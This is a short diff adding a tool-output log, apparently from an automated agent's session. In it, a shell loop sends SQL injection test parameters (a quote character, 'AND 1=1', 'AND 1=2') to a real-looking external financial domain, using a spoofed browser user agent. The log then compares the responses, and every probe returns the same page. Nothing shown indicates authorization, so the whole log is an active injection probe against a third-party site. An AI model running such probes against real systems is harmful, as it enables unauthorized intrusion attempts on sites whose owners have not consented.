@@ -1,0 +1,13 @@
+# command: cd $WORK_PATH 2>/dev/null || cd .; UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126"; B="https://www.infinitycapital.bh"; 
+for p in "id=1" "id=2" "id=1%27" "id=1%20AND%201=1" "id=1%20AND%201=2"; do
+ f=$(echo "$p"|tr -cd 'a-zA-Z0-9'); code=$(curl -sk -A "$UA" --max-time 20 -o "tool_outputs/bo_$f.html" -w "%{http_code}" "$B/?$p&page=2"); echo "$p -> $code $(md5sum tool_outputs/bo_$f.html|cut -c1-10) $(wc -c < tool_outputs/bo_$f.html)"; sleep 3; done
+# tool: tr
+# exit_code: 0
+# ts: 2026-09-30T12:10:26.213178+00:00
+# ---
+
+id=1 -> 200 781f86987e 27355
+id=2 -> 200 781f86987e 27355
+id=1%27 -> 200 781f86987e 27355
+id=1%20AND%201=1 -> 200 781f86987e 27355
+id=1%20AND%201=2 -> 200 781f86987e 27355
